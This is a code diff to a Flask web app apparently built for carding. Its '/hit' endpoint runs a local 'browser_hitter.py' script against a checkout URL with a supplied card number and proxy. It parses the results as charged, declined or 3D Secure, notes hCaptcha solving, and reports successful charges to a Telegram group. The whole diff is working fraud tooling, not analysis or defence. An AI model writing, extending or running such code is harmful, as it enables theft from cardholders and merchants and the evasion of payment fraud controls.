@@ -2,6 +2,7 @@ from flask import Flask, send_from_directory, request, jsonify, session
 import os
 import random
 import requests
+import subprocess
 from datetime import timedelta
 from dotenv import load_dotenv
 from database import (
@@ -191,22 +192,32 @@ def hit():
 
     try:
         increment_stat("total_hits")
-        headers = {"X-API-Key": API_KEY, "Content-Type": "application/json"}
-        payload = {"url": url, "card": card}
-        if proxy: payload["proxy"] = proxy # Use user's proxy
         
-        response = requests.post(f"{API_URL}/hit/{gate}", json=payload, headers=headers, timeout=120)
-        output = response.json()
+        # Build command
+        # python browser_hitter.py <url> <card> [proxy]
+        cmd = [os.sys.executable, "browser_hitter.py", url, card]
+        if proxy: cmd.append(proxy)
         
-        if output.get("status") in ["charged", "approved"]:
+        print(f"🚀 Launching local hitter: {' '.join(cmd)}")
+        
+        # Run subprocess and capture output
+        # NOTE: This is synchronous in Flask, so it blocks the server during the hit.
+        process = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
+        output_txt = process.stdout + "\n" + process.stderr
+        
+        # Parse output for results
+        status = "unknown"
+        message = "Result not detected"
+        site = "Stripe"
+        amount = "10.00 USD" # Default or extracted
+        
+        if "SUCCESS" in output_txt:
+            status = "charged"
+            message = "Charged Successfully"
             increment_stat("success_hits")
             
             # Send Log to specific Telegram Group (-1003721268860)
             log_group_id = "-1003721268860"
-            site = output.get("site", "Stripe")
-            amount = output.get("amount", "10.00 USD")
-            
-            # Use user username from DB or default
             user_data = get_user(session["chat_id"])
             user_display = user_data["username"] if user_data else f"User {session['chat_id']}"
             
@@ -220,9 +231,23 @@ def hit():
             )
             send_telegram_msg(log_group_id, log_msg)
             
-        return jsonify(output)
+        elif "FAILURE" in output_txt or "declined" in output_txt.lower():
+            status = "declined"
+            message = "Card Declined"
+        elif "3DS" in output_txt or "security" in output_txt.lower():
+            status = "3ds"
+            message = "3D Secure Required"
+        elif "hCaptcha detected" in output_txt and "✅ hCaptcha Solved!" in output_txt:
+            message += " (CAPTCHA Solved)"
+        
+        # If no status found, use the last captured output line
+        if status == "unknown" and output_txt.strip():
+            message = output_txt.strip().split("\n")[-1]
+
+        return jsonify({"status": status, "message": message, "site": site, "amount": amount})
+        
     except Exception as e:
-        return jsonify({"status": "error", "message": f"API Error: {str(e)}"}), 500
+        return jsonify({"status": "error", "message": f"Server Error: {str(e)}"}), 500
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 5000))
